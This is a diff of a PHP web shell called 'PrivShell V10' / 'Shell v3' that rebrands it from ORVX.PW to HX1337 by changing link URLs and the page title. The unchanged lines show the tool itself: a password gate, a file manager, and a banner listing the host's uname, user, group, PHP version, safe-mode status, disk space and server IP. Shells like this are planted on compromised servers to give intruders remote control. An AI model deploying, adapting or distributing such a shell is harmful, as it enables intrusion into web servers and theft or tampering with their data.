@@ -224,7 +224,7 @@ if(isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) != $password_shell)){
     border-radius: 15px;
 "> 
       <div class="card-body">
-        <a href="https://orvx.pw" target="_blank" style="
+        <a href="https://res.cloudinary.com/dpvlnsf7p/image/upload/v1752452856/hx1337_rxmte1.png" target="_blank" style="
     color: #FF0000 !important;
     background-color: transparent;
 " class="brand-logo">
@@ -466,7 +466,7 @@ if(isset($_REQUEST['email'])){
           border-radius: 15px;
   "> 
                 <div class="card-body">
-                  <a href="https://orvx.pw" target="_blank" style="
+                  <a href="https://res.cloudinary.com/dpvlnsf7p/image/upload/v1752452856/hx1337_rxmte1.png" target="_blank" style="
           color: #FF0000 !important;
           background-color: transparent;
   " class="brand-logo">
@@ -560,7 +560,7 @@ if($cwd[strlen($cwd)-1] != '/')
 function hardHeader() {
         if(empty($_POST['charset']))
                 $_POST['charset'] = $GLOBALS[$dec];
-        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - ORVX.PW - Shell v3</title><link rel='shortcut icon' href='https://res.cloudinary.com/dpvlnsf7p/image/upload/v1752452856/hx1337_rxmte1.png'>
+        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - HX1337 - Shell v3</title><link rel='shortcut icon' href='https://res.cloudinary.com/dpvlnsf7p/image/upload/v1752452856/hx1337_rxmte1.png'>
 <style>
         body {background-color:black; color:#FF0000; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } 
         body,td,th      {font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
@@ -746,7 +746,7 @@ if(!empty($GLOBALS['password_shell'])){
         echo '<table style="background-color: #559;" class=info cellpadding=3 cellspacing=0 width=100%><tr style="background: #0000009e;"><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
                  '<td><b style="display:none" id="systemshort">'.PHP_OS.'</b><nobr id="systemdet">'.substr(@php_uname(), 0, 120).'</nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br><nobr id="systemphp">'.@phpversion().'</nobr> <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color= #EA5455>ON</font>':'<font color=#28C76F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
                  '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>-</nobr></td></tr></table>'.
-                 '<table style="background-color:black;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div><br><center><a  href="https://orvx.pw" target = "_blank"style="font-size: 20px;font-weight: 600;color: #ea5455 !important;">PrivShell V10</a></center>';
+                 '<table style="background-color:black;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div><br><center><a  href="https://res.cloudinary.com/dpvlnsf7p/image/upload/v1752452856/hx1337_rxmte1.png" target = "_blank"style="font-size: 20px;font-weight: 600;color: #ea5455 !important;">PrivShell V10</a></center>';
 }
 function generateRandomString($length) {
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
